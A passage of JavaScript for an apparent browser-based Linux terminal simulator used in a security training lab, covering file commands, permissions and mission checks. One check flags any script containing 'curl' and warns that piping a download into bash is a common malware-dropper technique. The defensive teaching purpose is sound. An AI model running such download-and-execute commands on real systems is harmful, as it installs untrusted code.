          delete pr.dir.ch[pr.name];
        });
        return '';
      }
      case 'cp': case 'mv': {
        var cf = flags(); if (cf.r.length < 2) this.err(cmd + ': missing destination file operand');
        var dst = cf.r[cf.r.length - 1], dn = this.node(this.abs(dst));
        cf.r.slice(0, -1).forEach(function (s) {
          var sa = self.abs(s), sn = self.node(sa);
          if (!sn) self.err(cmd + ": cannot stat '" + s + "': No such file or directory");
          if (sn.t === 'd' && cmd === 'cp' && !cf.f.r) self.err("cp: -r not specified; omitting directory '" + s + "'");
          if (cmd === 'cp' && sn.t === 'f' && !self.can(sn, 4)) self.err("cp: cannot open '" + s + "' for reading: Permission denied");
          var target = dn && dn.t === 'd' ? self.abs(dst) + '/' + sa.split('/').pop() : self.abs(dst);
          var pr = self.parent(target); if (!pr.dir || !self.can(pr.dir, 2)) self.err(cmd + ": cannot create '" + dst + "': Permission denied");
          var copy = JSON.parse(JSON.stringify(sn)); if (cmd === 'cp') { copy.o = self.user; copy.g = self.user; }
          pr.dir.ch[pr.name] = copy;
          if (cmd === 'mv') { var sp = self.parent(sa); delete sp.dir.ch[sp.name]; }
        });
        return '';
      }
      case 'chmod': {
        var mode = args[0], targets = args.slice(1);
        if (!mode || !targets.length) this.err('chmod: missing operand');
        targets.forEach(function (p) {
          var n = self.node(self.abs(p)); if (!n) self.err("chmod: cannot access '" + p + "': No such file or directory");
          if (self.user !== 'root' && n.o !== self.user) self.err("chmod: changing permissions of '" + p + "': Operation not permitted");
          if (/^[0-7]{3,4}$/.test(mode)) { n.m = parseInt(mode, 8); return; }
          mode.split(',').forEach(function (part) {
            var mm = /^([ugoa]*)([+\-=])([rwxt]*)$/.exec(part); if (!mm) self.err("chmod: invalid mode: '" + mode + "'");
            var who = mm[1] || 'a', bits = 0;
            mm[3].split('').forEach(function (c) { var v = c === 'r' ? 4 : c === 'w' ? 2 : c === 'x' ? 1 : 0; if (c === 't') bits |= 512; ['u', 'g', 'o'].forEach(function (w, i) { if (who.indexOf(w) > -1 || who.indexOf('a') > -1) bits |= v << (6 - 3 * i); }); });
            if (mm[2] === '+') n.m |= bits; else if (mm[2] === '-') n.m &= ~bits; else { var mask = 0; ['u', 'g', 'o'].forEach(function (w, i) { if (who.indexOf(w) > -1 || who.indexOf('a') > -1) mask |= 7 << (6 - 3 * i); }); n.m = (n.m & ~mask) | bits; }
          });
        });
        return '';
      }
      case 'chown': if (this.user !== 'root') this.err("chown: changing ownership of '" + (args[1] || '') + "': Operation not permitted"); args.slice(1).forEach(function (p) { var n = self.node(self.abs(p)); if (n) { var og = args[0].split(':'); n.o = og[0]; if (og[1]) n.g = og[1]; } }); return '';
      case 'answer': case 'submit': return this.answer(args.join(' '));
      case 'bash': case 'sh': return this.script(args[0], true);
      default:
        if (/^(\.|~)?\/?[\w./-]+\.sh$/.test(cmd) || cmd.indexOf('./') === 0 || cmd[0] === '/') return this.script(cmd, false);
        this.err(cmd + ': command not found');
    }
  };
  Shell.prototype.script = function (p, viaShell) {
    if (!p) return '';
    var n = this.node(this.abs(p)); if (!n) this.err('bash: ' + p + ': No such file or directory');
    if (n.t === 'd') this.err('bash: ' + p + ': Is a directory');
    if (!viaShell && !this.can(n, 1)) this.err('bash: ' + p + ': Permission denied');
    if (viaShell && !this.can(n, 4)) this.err('bash: ' + p + ': Permission denied');
    if (n.c === 'ELF binary') return '';
    if (/curl/.test(n.c)) return 'Stopped. This file pipes a download into bash, which is how many Linux malware droppers work. Never run it. Delete it with rm.';
    if (/ss -tuln/.test(n.c)) return this.exec(['ss'], null);
    return '';
  };
  Shell.prototype.answer = function (v) {
    var m = (this.cfg.missions || [])[this.mi];
    if (!m || m.c.type !== 'answer') return 'No question is waiting for an answer right now.';
    this.lastAnswer = v.trim();
    return m.c.v.toLowerCase() === v.trim().toLowerCase() ? '' : 'Not that one. Look at the data again.';
  };

  /* ---------- mission checks ---------- */
  Shell.prototype.check = function (line) {
    var ms = this.cfg.missions || [], m = ms[this.mi]; if (!m) return;
    var c = m.c, ok = false, n;
    switch (c.type) {
      case 'cmd': ok = new RegExp(c.re).test(line.trim()); break;
      case 'cwd': ok = this.cwd === c.path; break;
      case 'exists': n = this.node(c.path); ok = !!n && (!c.kind || n.t === c.kind); break;
      case 'gone': ok = !this.node(c.path); break;
      case 'contains': n = this.node(c.path); ok = !!n && n.t === 'f' && n.c.toLowerCase().indexOf(c.text.toLowerCase()) > -1; break;
      case 'mode': n = this.node(c.path); ok = !!n && (c.octal ? (n.m & 511) === parseInt(c.octal, 8) : !!(n.m & c.bit)); break;
      case 'output': ok = this.last.out === c.v && (!c.re || new RegExp(c.re).test(line)); break;
      case 'answer': ok = this.lastAnswer != null && this.lastAnswer.toLowerCase() === c.v.toLowerCase(); break;
    }
    if (!ok) return;
    this.print('Mission ' + (this.mi + 1) + ' complete. ' + (m.ok || ''), 'ok');
    this.mi++; this.lastAnswer = null; this.renderMissions();
    if (this.mi === ms.length) {
      this.print('All ' + ms.length + ' missions done. Your progress for this lab section was saved in this browser.', 'ok');
      var ev = new CustomEvent('cwm:term-done', { detail: { id: this.cfg.id } }); document.dispatchEvent(ev);
    }
  };

  function init() {
    Array.prototype.forEach.call(document.querySelectorAll('.lx-term'), function (t) {
      var cfgEl = t.querySelector('.lx-term-cfg'), cfg = {};
      try { cfg = JSON.parse(cfgEl.textContent); } catch (e) { cfg = {}; }
      t.shell = new Shell(t, cfg);
    });
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init); else init();
})();
